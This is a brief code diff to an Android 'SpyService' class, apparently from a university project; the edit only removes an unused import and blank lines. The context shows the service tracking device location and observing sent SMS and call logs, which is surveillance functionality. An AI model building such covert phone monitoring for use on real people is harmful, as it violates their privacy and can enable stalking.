@@ -3,7 +3,6 @@ package edu.uj.jkordas.spy;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
-import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
@@ -38,8 +37,7 @@ public class SpyService extends Service {
     private void loadLocationManager() {
         locationListener = new SpyLocationListener(getApplicationContext());
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        // Define the criteria how to select the locatioin provider
-        Criteria criteria = new Criteria();
+
         String provider = LocationManager.NETWORK_PROVIDER;
         Location location = locationManager.getLastKnownLocation(provider);
 
@@ -74,7 +72,6 @@ public class SpyService extends Service {
             SpyService.this.getContentResolver().unregisterContentObserver(sentSmsObserver);
             sentSmsObserver = null;
         }
-
     }
 
     private void registerSmsObserver() {
@@ -91,7 +88,6 @@ public class SpyService extends Service {
             SpyService.this.getContentResolver().unregisterContentObserver(callObserver);
             callObserver = null;
         }
-
     }
 
     private void registerCallObserver() {
